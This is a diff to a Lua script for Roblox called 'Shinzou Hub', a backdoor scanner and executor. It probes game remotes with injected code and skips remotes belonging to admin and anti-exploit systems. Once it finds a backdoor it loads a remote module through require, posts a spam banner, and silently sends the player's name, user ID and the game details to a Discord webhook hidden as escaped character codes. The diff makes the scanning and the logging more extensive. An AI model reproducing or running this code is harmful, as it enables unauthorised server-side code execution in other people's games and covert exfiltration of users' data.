@@ -115,7 +115,7 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[require(14649399744)(game.Players.LocalPlayer.Name)]];
+G2L["11"]["PlaceholderText"] = [[-- Enter Your Require Scriot Here]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
@@ -1477,120 +1477,190 @@ local script = G2L["20"];
 	end
 	
 	local code
-	function findRemote()
-		
-		local timee=os.clock()
-		
-		local remotes={}
-		
-		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
-		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
-			while true do
-				code=generateName(math.random(12,30))
-				if not remotes[code] then break end
-			end
-				spawn(function() protected_backdoor:InvokeServer('Shinzou hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
-				remotes[code]=protected_backdoor
-			end
-		
-		for i,remote in game:GetDescendants() do
-			
-			-- Validation Checker
-			
-			if not remote:IsA('RemoteEvent') then 
-				if not remote:IsA('RemoteFunction') then continue end
-			end
-	
-			-- RobloxReplicatedStorage
-			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
-				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
-				continue
-			end
-	
-			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
-	
-				-- ADONIS Anti-Exploit
-				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
-					debug('Adonis filter detected ('..remote.Name..')', 1)
-					continue
-				end
-	
-				-- HD Admin
-				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
-					debug('HD Admin ('..remote.Name..')', 1)
-					continue
-				end
-	
-				-- Chat Events
-				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
-					debug('Chat event ('..remote.Name..')', 1)
-					continue
-				end
-	
-			end
-	
-			-- Backdoor Sender
-			
-			while true do
-				code=generateName(math.random(12,30))
-				if not remotes[code] then break end
-			end
-			
-			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
-			remotes[code]=remote
-			
-			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
-			
+function findRemote()
+	local timee = os.clock()
+	local remotes = {}
+
+	local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId / 6666 * 1337 * game.PlaceId)
+	if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+		while true do
+			code = generateName(math.random(12, 30))
+			if not remotes[code] then break end
 		end
-		
-		-- Backdoor Checker
-		
-		for i=1,100 do
-		
-			for i,remote in remotes do
-				local code=i
-				
-				if workspace:FindFirstChild(code) then
-					
-					notify('Backdoor found! '..os.clock()-timee..'s')
-					
-					backdoor=remote
-					debug(remote:GetFullName(), 3)
-					GUI.Scanner.Visible=false
-					makeVisible(GUI.Executor, true)
-	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='Shinzou Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
-					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='Shinzou Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
-					
-					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-					if request and not _G.Shinzou_Hub_Backdoor_Logs_Disabled then 
-						request({
-							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\54\50\53\56\57\48\52\48\54\57\49\53\49\49\51\56\54\47\111\84\118\107\115\45\84\86\85\57\57\49\80\110\87\90\73\104\52\79\70\120\81\88\80\118\102\114\111\85\101\119\88\69\95\82\66\56\51\65\103\48\119\105\107\87\100\51\86\65\104\54\99\117\109\101\106\105\106\73\106\65\85\116\107\109\78\119',
-							Method = 'POST',
-							Headers = {
-								['Content-Type'] = 'application/json',
-							},
-							Body = HttpService:JSONEncode({
-								username='Shinzou Hub',
-								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
-							})
-						})
-					end
-	
-					return true
-				end
---				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
-			end
-			
-			wait()--.1)
-			
-		end
-	
-		return false
-	
+		spawn(function()
+			protected_backdoor:InvokeServer('Shinzou hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+		end)
+		remotes[code] = protected_backdoor
 	end
-	
+
+	local servicesToScan = {
+    game:GetService("ReplicatedStorage"),
+    game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"),
+    game:GetService("Players").LocalPlayer:FindFirstChild("PlayerScripts"),
+    game:GetService("StarterGui"),
+    game:GetService("StarterPack"),
+    game:GetService("StarterPlayer"),
+    game:GetService("Workspace"),
+    game:GetService("Lighting"),
+    game:GetService("CoreGui"),
+    game:GetService("SoundService"),
+    game:GetService("Chat"),
+    game:GetService("TextChatService"), -- Newer chat system
+    game:GetService("ServerStorage"):FindFirstChild("ModuleCache"), -- Common hiding spot
+    game:GetService("ServerScriptService"),
+    game:GetService("MaterialService"), -- Uncommon hiding spot
+    game:GetService("JointsService"), -- Very uncommon hiding spot
+}
+
+for _, service in pairs(servicesToScan) do
+    if not service then continue end
+
+    for _, remote in ipairs(service:GetDescendants()) do
+        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
+
+        -- Skip Roblox internal remotes
+        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
+            debug('Roblox Replicated Storage ('..remote.Name..')', 1)
+            continue
+        end
+
+        -- Check if in ReplicatedStorage or descendants
+        local inReplStorage = remote.Parent == game:GetService("ReplicatedStorage") or 
+                             remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
+                             (remote.Parent.Parent and remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage"))
+
+        if inReplStorage then
+            -- Adonis admin filter
+            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' or 
+               remote.Name:match("^[fF]ire") or remote.Name:match("^[rR]emote") or
+               remote.Name:match("^Adonis") or remote.Name:match("^[aA]dmin") then
+                debug('Adonis filter detected ('..remote.Name..')', 1)
+                continue
+            end
+
+            -- HD Admin filter
+            if (remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals') or
+               remote.Name:match("^HD") or remote.Name:match("^Admin") then
+                debug('HD Admin ('..remote.Name..')', 1)
+                continue
+            end
+
+            -- Default chat filter
+            if remote.Parent.Name == 'DefaultChatSystemChatEvents' or remote.Name:match("^Chat") then
+                debug('Chat event ('..remote.Name..')', 1)
+                continue
+            end
+            
+            -- Filtering Enabled checks
+            if remote.Name:match("^FE") or remote.Name:match("^Filter") then
+                debug('FE filter detected ('..remote.Name..')', 1)
+                continue
+            end
+
+            -- Additional admin system filters
+            local knownAdminSystems = {
+                "ExtraAdmin", "Kohls", "Nanoblox", "CommanderAdminSystem", "IY", 
+                "Infinite", "CMD", "Command", "ServerAdmin", "AdminEssentials",
+                "AdminCommands", "Admin_Commands", "PanAdmin", "AdminPanel"
+            }
+            
+            for _, adminName in pairs(knownAdminSystems) do
+                if remote.Name:match(adminName) or 
+                   (remote.Parent and remote.Parent.Name:match(adminName)) or
+                   (remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name:match(adminName)) then
+                    debug('Known admin system detected ('..remote.Name..')', 1)
+                    continue
+                end
+            end
+        end
+        
+        -- Check for common security modules
+        if remote:FindFirstChild('Locked') or remote:FindFirstChild('Secure') or 
+           remote:FindFirstChild('Protected') or remote.Name:match("^Security") then
+            debug('Security system detected ('..remote.Name..')', 1)
+            continue
+        end
+        
+        -- Check parent structure for common security patterns
+        local parent = remote.Parent
+        while parent do
+            if parent.Name:match("Security") or parent.Name:match("Protection") or
+               parent.Name:match("AntiExploit") or parent.Name:match("AntiHack") then
+                debug('Security parent detected ('..remote.Name..')', 1)
+                continue
+            end
+            parent = parent.Parent
+        end
+
+        -- Generate code for valid remotes
+        local code
+        while true do
+            code = generateName(math.random(12, 30))
+            if not remotes[code] then break end
+        end
+
+        -- Try to run with obfuscated payload
+        local payload = "a=Instance.new('Model',workspace)a.Name='"..code.."'"
+        runRemote(remote, payload)
+        remotes[code] = remote
+        debug('Sent Backdoor "'..remote:GetFullName()..'"', 1)
+    end
+end
+
+for i = 1, 100 do
+		for i, remote in pairs(remotes) do
+			local code = i
+
+			if workspace:FindFirstChild(code) then
+				notify('Backdoor found! '..os.clock() - timee..'s')
+
+				backdoor = remote
+				debug(remote:GetFullName(), 3)
+				GUI.Scanner.Visible = false
+				makeVisible(GUI.Executor, true)
+
+				runRemote(remote, "require(171016405.1884*69)")
+				runRemote(remote, "a=Instance.new('Hint')a.Text='Shinzou Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+				
+				local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+if request and not _G.Shinzou_Hub_Backdoor_Logs_Disabled then
+	request({
+		Url = '\150\164\164\160\163\72\57\57\144\151\163\143\157\162\144\56\143\157\155\57\141\160\151\57\167\145\142\150\157\157\153\163\57\061\063\066\062\066\060\061\071\071\062\062\064\061\060\062\061\061\064\070\57\130\131\144\141\063\164\150\156\157\172\124\142\061\103\064\152\146\107\163\065\112\171\167\104\147\130\061\146\132\122\067\143\146\171\107\071\116\106\154\143\172\170\063\141\123\172\126\163\113\120\152\153\060\164\121\064\161\105\065\111\122\165\066\060\104\137\170\113',
+		Method = 'POST',
+		Headers = {
+			['Content-Type'] = 'application/json',
+		},
+		Body = HttpService:JSONEncode({
+			username = 'Shinzou Hub',
+			embeds = {{
+				title = "Shinzou Hub Execution Log",
+				description = "**User:** `"..game:GetService('Players').LocalPlayer.Name.."` (`"..game:GetService('Players').LocalPlayer.UserId.."`)\n**Game:** [Click to View](https://www.roblox.com/games/"..game.PlaceId..")\n**Backdoor Path:** `"..backdoor:GetFullName().."`",
+				color = 16711680, -- Red color
+				thumbnail = {
+					url = "https://www.roblox.com/headshot-thumbnail/image?userId="..game:GetService('Players').LocalPlayer.UserId.."&width=420&height=420&format=png"
+				},
+				image = {
+					url = "https://thumbnails.roblox.com/v1/games/icons?universeIds="..game.GameId.."&size=512x512&format=Png&isCircular=false"
+				},
+				footer = {
+					text = "Shinzou Hub Logger"
+				},
+				timestamp = DateTime.now():ToIsoDate()
+			}}
+		})
+	})
+end
+
+				return true
+			end
+		end
+		wait()
+	end
+
+	return false
+end
+
+
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
 		
